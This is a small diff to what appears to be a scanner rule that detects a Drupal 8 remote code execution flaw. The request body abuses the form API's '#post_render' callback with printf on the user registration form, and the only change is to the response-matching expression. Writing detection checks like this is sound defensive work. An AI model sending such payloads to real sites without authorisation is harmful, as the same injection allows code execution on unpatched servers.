@@ -10,7 +10,7 @@ rules:
     body: |
       form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]={{r1}}%25%25{{r2}}
     expression: |
-      body.bcontains(bytes(r1+'%'+r2))
+      response.body.bcontains(bytes(r1+'%'+r2))
 detail:
   drupal_version: 8
   links:
